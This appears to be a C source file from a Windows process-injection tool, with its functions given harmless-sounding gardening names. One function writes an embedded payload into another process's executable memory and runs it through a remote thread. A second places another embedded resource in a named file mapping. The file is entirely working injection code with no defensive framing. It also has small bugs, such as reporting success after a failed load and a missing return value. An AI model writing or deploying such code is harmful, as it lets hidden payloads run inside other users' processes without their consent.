#include "bloom.h"
#include "report.h"
#include "resource.h"
#include "filemap.h"

BOOL FlourishProcess(DWORD pid)
{
    HANDLE process = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!process)
    {
        ReportFail(L"OpenProcess failed for process %lu", pid);
        return FALSE;
    }

    void* buffer = NULL;
    DWORD size = 0;
    if (!FetchResource(IDR_FLOURISH, &buffer, &size))
    {
        ReportFail(L"failed to load [flourish] buffer");
        return TRUE;
    }

    ReportInfo(L"found [flourish] with %u bytes", size);

    LPVOID address = VirtualAllocEx(process, NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!address)
    {
        CloseHandle(process);
        ReportFail(L"VirtualAllocEx failed for process %lu", pid);
        return FALSE;
    };

    if (!WriteProcessMemory(process, address, buffer, size, NULL))
    {
        CloseHandle(process);
        ReportFail(L"WriteProcessMemory failed for process %lu", pid);
        return FALSE;
    };

    HANDLE thread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)address, NULL, 0, NULL);
    if (thread != NULL)
    {
        WaitForSingleObject(thread, 500);
        CloseHandle(thread);
        CloseHandle(process);
        ReportSuccess(L"created remote thread for process %lu", pid);
        return TRUE;
    }
    
    ReportFail(L"CreateRemoteThread failed for process %lu", pid);
    CloseHandle(process);
    return FALSE;
}

BOOL FertilizeDaisy(void)
{
    void* buffer = NULL;
    DWORD size = 0;
    if (!FetchResource(IDR_FERTILIZER, &buffer, &size))
    {
        ReportFail(L"failed to load [IDR_FERTILIZER] buffer");
        return TRUE;
    }
    
    HANDLE hMapFile = FileMapCreate(CONFIG_FERTILIZER_MAPPING_NAME, buffer, size);
    if (hMapFile == NULL)
    {
        ReportFail(L"FileMapCreate failed: %lu", GetLastError());
        return 1;
    }
    ReportSuccess(L"created the [fertilizer]");
}